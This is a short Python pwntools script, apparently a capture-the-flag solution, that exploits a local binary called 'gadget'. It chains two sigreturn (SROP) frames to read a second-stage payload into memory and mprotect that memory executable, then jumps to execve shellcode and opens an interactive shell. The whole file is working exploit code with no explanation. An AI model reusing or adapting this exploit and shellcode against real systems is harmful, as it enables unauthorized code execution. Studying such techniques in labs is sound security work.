from pwn import *
p = process('./gadget' )
context.clear(arch="amd64")
#gdb.attach(p)
#pause()
p.recv()

shellcode = "\bin\sh"+"\x00"+"\x90"*30 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

syscall_addr = 0x40100c
pop_rax = 0x000000000040104d

pay = "AAAAAAAA" + "AAAAAAAA" + p64(pop_rax) + p64(15) + p64(syscall_addr)

frame1 = SigreturnFrame(kernel="amd64")

frame1.rsp = 0x402040
frame1.rip = syscall_addr
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = 0x402000
frame1.rdx = 500

pay += str(frame1)

p.sendline(pay)


pay1 = shellcode + p64(pop_rax) + p64(15) + p64(syscall_addr)

frame2 = SigreturnFrame(kernel="amd64")

frame2.rsp = 0x402000+len(pay1)+248
frame2.rip = syscall_addr
frame2.rax = 10
frame2.rdi = 0x402000
frame2.rsi = 2000
frame2.rdx = 7

pay1 += str(frame2)

pay1 += p64(0x402010)

p.sendline(pay1)

p.interactive()

